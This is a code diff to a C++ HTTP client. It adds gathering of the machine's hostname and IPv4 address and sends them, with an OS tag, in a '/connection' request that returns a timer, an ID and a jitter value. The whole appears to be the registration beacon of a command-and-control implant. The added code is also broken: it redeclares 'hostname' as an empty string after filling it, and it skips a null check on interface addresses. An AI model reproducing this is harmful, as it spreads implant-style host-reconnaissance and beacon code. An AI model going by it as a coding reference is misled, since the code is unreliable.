@@ -3,12 +3,41 @@
 #include <tuple>
 #include <stdexcept>
 #include <curl/curl.h>
+#include <unistd.h>
+#include <ifaddrs.h>
+#include <arpa/inet.h>
 
 class Client {
 public:
     static std::tuple<int, std::string, int> httpConnection(const std::string& address) {
-        // Create the URL for the GET request
-        std::string url = "http://" + address + "/connection?name=" + "hostname" + "&os=" + "OS" + "&address=" + "IP";
+        char hostname[1024];
+        if (gethostname(hostname, sizeof(hostname)) != 0) {
+            throw std::runtime_error("Failed to get hostname");
+        }
+        std::string hostname;
+        
+        char ip_buffer[INET_ADDRSTRLEN];
+        struct ifaddrs *ifap, *ifa;
+        struct sockaddr_in *sa;
+
+        if (getifaddrs(&ifap) == 0) {
+            for (ifa = ifap; ifa != nullptr; ifa = ifa->ifa_next) {
+            if (ifa->ifa_addr->sa_family == AF_INET) {
+                sa = (struct sockaddr_in *) ifa->ifa_addr;
+                inet_ntop(AF_INET, &(sa->sin_addr), ip_buffer, INET_ADDRSTRLEN);
+                if (std::string(ifa->ifa_name) == "eth0") { // Assuming eth0 is the interface you want
+                break;
+                }
+            }
+            }
+            freeifaddrs(ifap);
+        } else {
+            throw std::runtime_error("Failed to get IP address");
+        }
+
+        std::string IPAddress(ip_buffer);
+
+        std::string url = "http://" + address + "/connection?name=" + hostname + "&os=" + "C++" + "&address=" + IPAddress;
         std::cout << "Request URL: " << url << std::endl;
 
         // Call the getRequest method
@@ -67,7 +96,7 @@ private:
 
 int main() {
     try {
-        auto result = Client::httpConnection("example.com");
+        auto result = Client::httpConnection("127.0.0.1");
         std::cout << "Timer: " << std::get<0>(result) << ", ID: " << std::get<1>(result) << ", Jitter: " << std::get<2>(result) << std::endl;
     } catch (const std::exception& e) {
         std::cerr << "Failed to establish HTTP connection: " << e.what() << std::endl;
